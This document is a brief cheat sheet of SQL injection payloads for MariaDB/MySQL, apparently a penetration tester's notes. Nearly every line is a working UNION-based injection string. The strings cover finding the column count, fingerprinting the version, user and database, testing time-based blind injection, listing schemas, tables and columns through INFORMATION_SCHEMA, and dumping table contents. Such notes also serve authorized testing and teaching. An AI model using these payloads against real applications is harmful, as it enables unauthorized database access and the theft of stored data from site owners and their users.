# Mariadb / MySQL
' ORDER BY 1 -- - Increment until you get an exception like "Unknown column '5' in 'order clause'"
VALUE' UNION SELECT 1 -- - Where value is something useful to the db you are testing. Exceptions thrown until you hit enough columns to match current Table:
VALUE' UNION SELECT 1,2 -- -
VALUE' UNION SELECT 1,2,3 -- -
VALUE' UNION SELECT 1,2,3,4 -- -
VALUE' UNION SELECT 1,@@version,2,3,4 -- -
VALUE' UNION SELECT 1,2,user(),4 -- -
VALUE' UNION SELECT 1,SLEEP(5),3,4 -- - Blind SQL, test if we can get a delay on response.
VALUE' UNION SELECT 1,2,POW(1,1),4 -- - POW(1,1) is specific to MySQL / Mariadb

# If webserver is NGINX or Apache, most likely a Linux variant like MySQL, Mariadb, MongoDB, or Postgresql.
# If webserver is IIS, most likely MSSQL.
#  Not always true so make sure you test all possible fuzzing for each db syntax. Remember Docker containers help with syntax checks.


# Using the INFORMATION_SCHEMA database
# Command to see databases:
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

# SQLi to see databases
VALUE' UNION SELECT 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA -- - Will show all db's that exist, the current user has access
VALUE' UNION SELECT 1,database(),3,4 -- - Will show the current working database

# SQLi to see tables within databases
VALUE' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='DATABASENAME' -- - this shows only tables in DATABASENAME, otherwise we may get a tone of output.

# SQLi to see columns within a table
VALUE' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS WHERE table_name='TABLENAME' -- - This will show the columns in the TABLENAME table.

# Dump the data from the db.table
VALUE' UNION SELECT 1,COLUMN1,COLUMN2,4 from DB.TABLE -- -

